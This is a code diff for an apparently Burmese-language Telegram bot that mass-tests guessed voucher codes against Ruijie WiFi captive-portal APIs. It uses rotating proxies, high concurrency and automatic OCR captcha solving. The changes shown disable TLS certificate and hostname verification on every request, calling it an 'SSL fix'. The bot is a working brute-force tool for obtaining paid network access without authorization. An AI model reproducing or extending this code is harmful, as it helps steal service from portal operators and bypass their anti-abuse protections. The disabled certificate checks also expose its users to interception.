@@ -1,6 +1,7 @@
 import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, aiofiles
 import logging
 import urllib.parse
+import ssl
 from telebot.async_telebot import AsyncTeleBot
 from telebot import types
 from aiohttp import web
@@ -9,6 +10,11 @@ import ddddocr
 import numpy as np
 from datetime import datetime, timedelta, timezone
 from aiohttp_socks import ProxyConnector, ProxyConnectionError
+
+# ==================== SSL FIX (100%) ====================
+ssl_context = ssl.create_default_context()
+ssl_context.check_hostname = False
+ssl_context.verify_mode = ssl.CERT_NONE
 
 # ==================== LOGGING ====================
 logging.basicConfig(
@@ -59,7 +65,7 @@ PROXIES = [
 ]
 
 CONCURRENCY = 100
-BATCH_SIZE = 1000
+BATCH_SIZE = 100  # ✅ 100 သို့ လျှော့ (progress မြန်အောင်)
 
 dead_proxies = set()
 proxy_lock = asyncio.Lock()
@@ -95,10 +101,7 @@ AUTH_CACHE_TTL = 30
 
 # ==================== HELPER: EXTRACT DOMAIN ====================
 def extract_portal_domain(session_url):
-    """
-    Session URL ကနေ domain ကို ဆွဲထုတ်
-    ဥပမာ: https://portal-mm-as.ruijienetworks.com/... → portal-mm-as.ruijienetworks.com
-    """
+    """Session URL ကနေ domain ကို ဆွဲထုတ်"""
     try:
         parsed = urllib.parse.urlparse(session_url)
         domain = parsed.netloc
@@ -106,7 +109,7 @@ def extract_portal_domain(session_url):
             return domain
     except Exception as e:
         logger.warning(f"Domain extract error: {e}")
-    return "portal-as.ruijienetworks.com"  # fallback
+    return "portal-as.ruijienetworks.com"
 
 
 # ==================== WEB SERVER ====================
@@ -130,11 +133,11 @@ async def web_server():
     logger.info(f"🌐 Web server started on port {port}")
 
 
-# ==================== PROXY ====================
+# ==================== PROXY (SSL FIX 100%) ====================
 async def get_random_proxy_connector():
     global PROXY_ENABLED
     if not PROXY_ENABLED:
-        return aiohttp.TCPConnector(ssl=True), None
+        return aiohttp.TCPConnector(ssl=False), None
 
     async with proxy_lock:
         available_proxies = [p for p in PROXIES if p not in dead_proxies]
@@ -144,16 +147,16 @@ async def get_random_proxy_connector():
         proxy_url = random.choice(available_proxies) if available_proxies else None
 
     if not proxy_url:
-        return aiohttp.TCPConnector(ssl=True), None
+        return aiohttp.TCPConnector(ssl=False), None
 
     try:
-        connector = ProxyConnector.from_url(proxy_url, ssl=True)
+        connector = ProxyConnector.from_url(proxy_url, ssl=False)
         return connector, proxy_url
     except Exception as e:
         logger.warning(f"[Proxy Error] {proxy_url}: {e}")
         async with proxy_lock:
             dead_proxies.add(proxy_url)
-        return aiohttp.TCPConnector(ssl=True), None
+        return aiohttp.TCPConnector(ssl=False), None
 
 
 # ==================== DATA ====================
@@ -906,14 +909,10 @@ async def save_rechecked_codes(chat_id_str, recheck_list):
     await save_result()
 
 
-# ==================== SESSION CHECK (FIXED) ====================
+# ==================== SESSION CHECK (SSL FIX 100%) ====================
 async def check_session_url(session_url):
-    """
-    ✅ FIXED: မည်သည့် Ruijie portal (portal-as, portal-mm-as, etc.) ကိုမဆို လက်ခံ
-    """
     if not session_url:
         return False
-    # Accept any ruijienetworks.com domain
     if "ruijienetworks.com" not in session_url:
         return False
 
@@ -924,22 +923,24 @@ async def check_session_url(session_url):
     for _ in range(3):
         connector, p_url = await get_random_proxy_connector()
         try:
-            timeout = aiohttp.ClientTimeout(total=15)
-            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as temp_session:
-                async with temp_session.get(session_url, allow_redirects=True, headers=headers) as response:
+            timeout = aiohttp.ClientTimeout(total=20)
+            # ✅ SSL FIX: ssl=False ကို session မှာ ထည့်
+            async with aiohttp.ClientSession(
+                connector=connector,
+                timeout=timeout,
+                connector_owner=False
+            ) as temp_session:
+                async with temp_session.get(session_url, allow_redirects=True, headers=headers, ssl=ssl_context) as response:
                     text_ = str(response.url)
                     body = ""
                     try:
                         body = await response.text()
                     except Exception:
                         pass
-                    # sessionId ရှိရင် valid
                     if "sessionId" in text_ or "sessionId" in body:
                         return True
-                    # Portal page ဖြစ်ရင် valid
                     if response.status == 200 and ("portal" in body.lower() or "ruijie" in body.lower() or "login" in body.lower()):
                         return True
-                    # Wifidog/stage=portal ဖြစ်ရင်လည်း valid (redirect ဖြစ်နိုင်)
                     if "stage=portal" in text_ or "stage=portal" in session_url:
                         return True
         except Exception as e:
@@ -962,7 +963,6 @@ async def handle_input(message):
     await bot.reply_to(message, "Session URL အားစစ်ဆေးနေပါသည်။")
     if await check_session_url(session_url=url):
         user_data[message.chat.id]['session_url'] = url
-        # ✅ Extract and save portal domain
         user_data[message.chat.id]['portal_domain'] = extract_portal_domain(url)
         logger.info(f"✅ Session saved. Portal domain: {user_data[message.chat.id]['portal_domain']}")
 
@@ -1326,7 +1326,8 @@ async def get_session_id(session, session_url, previous_session_id=None):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/148.0.0.0 Safari/537.36',
     }
     try:
-        async with session.get(session_url, headers=headers, allow_redirects=True) as req:
+        # ✅ SSL FIX: ssl=ssl_context
+        async with session.get(session_url, headers=headers, allow_redirects=True, ssl=ssl_context) as req:
             response = str(req.url)
             session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response)
             if session_id:
@@ -1348,7 +1349,8 @@ async def fetch_voucher_balance(session, session_id, portal_domain):
     }
     try:
         url = f'https://{portal_domain}/api/auth/balance/getBalance/{session_id}'
-        async with session.get(url, headers=headers) as req:
+        # ✅ SSL FIX
+        async with session.get(url, headers=headers, ssl=ssl_context) as req:
             respond = await req.json()
             return respond.get('result', {}) or {}
     except Exception:
@@ -1360,7 +1362,12 @@ async def fetch_voucher_balance_safe(session_id, portal_domain):
         connector, p_url = await get_random_proxy_connector()
         try:
             timeout = aiohttp.ClientTimeout(total=15)
-            async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as balance_session:
+            async with aiohttp.ClientSession(
+                connector=connector,
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=timeout,
+                connector_owner=False
+            ) as balance_session:
                 data = await fetch_voucher_balance(balance_session, session_id, portal_domain)
                 return data if isinstance(data, dict) else {}
         except Exception:
@@ -1371,7 +1378,7 @@ async def fetch_voucher_balance_safe(session_id, portal_domain):
     return {}
 
 
-# ==================== PERFORM CHECK (FIXED) ====================
+# ==================== PERFORM CHECK (SSL FIX 100%) ====================
 async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False, message=None):
     if not recheck:
         current_task = scan_tasks.get(chat_id)
@@ -1394,7 +1401,6 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 await bot.send_message(chat_id, f"❌ Limit ({limit}) ပြည့်ပါပြီ။")
                 return
 
-    # ✅ FIXED: Extract portal domain from session URL (dynamic)
     portal_domain = extract_portal_domain(session_url)
     post_url = f"https://{portal_domain}/api/auth/voucher/?lang=en_US"
 
@@ -1403,9 +1409,14 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
 
     for attempt in range(3):
         connector, p_url = await get_random_proxy_connector()
-        timeout = aiohttp.ClientTimeout(total=20)
+        timeout = aiohttp.ClientTimeout(total=25)
         try:
-            async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(), timeout=timeout) as task_session:
+            async with aiohttp.ClientSession(
+                connector=connector,
+                cookie_jar=aiohttp.CookieJar(),
+                timeout=timeout,
+                connector_owner=False
+            ) as task_session:
                 session_id = await get_session_id(task_session, session_url, None)
                 if not session_id:
                     if p_url:
@@ -1448,7 +1459,8 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                     "referer": f"https://{portal_domain}/download/static/maccauth/src/index.html?sessionId={session_id}",
                     "user-agent": "Mozilla/5.0 (Linux; Android 12; K) AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36",
                 }
-                async with task_session.post(post_url, json=data, headers=headers) as req:
+                # ✅ SSL FIX
+                async with task_session.post(post_url, json=data, headers=headers, ssl=ssl_context) as req:
                     response = await req.text()
                     try:
                         _ = json.loads(response)
@@ -1527,7 +1539,7 @@ async def perform_check(session_url, code, chat_id, scan_id=None, recheck=False,
                 logger.error(f"Limited Message Error: {e}")
 
 
-# ==================== OCR / CAPTCHA (FIXED) ====================
+# ==================== OCR / CAPTCHA (SSL FIX 100%) ====================
 _ocr = ddddocr.DdddOcr(show_ad=False)
 
 
@@ -1549,9 +1561,6 @@ async def Captcha_Text(image_bytes):
 
 
 async def Captcha_Image(session, session_id, portal_domain="portal-as.ruijienetworks.com"):
-    """
-    ✅ FIXED: Portal domain dynamic
-    """
     headers = {
         'authority': portal_domain,
         'accept': 'image/*,*/*;q=0.8',
@@ -1560,14 +1569,12 @@ async def Captcha_Image(session, session_id, portal_domain="portal-as.ruijienetw
     }
     params = {'sessionId': session_id, '_t': str(int(time.time() * 1000))}
     url = f'https://{portal_domain}/api/auth/captcha/image'
-    async with session.get(url, params=params, headers=headers) as req:
+    # ✅ SSL FIX
+    async with session.get(url, params=params, headers=headers, ssl=ssl_context) as req:
         return await req.read()
 
 
 async def Varify_Captcha(session, session_id, text, portal_domain="portal-as.ruijienetworks.com"):
-    """
-    ✅ FIXED: Portal domain dynamic
-    """
     headers = {
         'authority': portal_domain,
         'accept': '*/*',
@@ -1578,7 +1585,8 @@ async def Varify_Captcha(session, session_id, text, portal_domain="portal-as.rui
     }
     json_data = {'sessionId': session_id, 'authCode': text}
     url = f'https://{portal_domain}/api/auth/captcha/verify'
-    async with session.post(url, headers=headers, json=json_data) as req:
+    # ✅ SSL FIX
+    async with session.post(url, headers=headers, json=json_data, ssl=ssl_context) as req:
         data = await req.json()
         success = data.get("success")
         if success is True or str(success).lower() == "true":
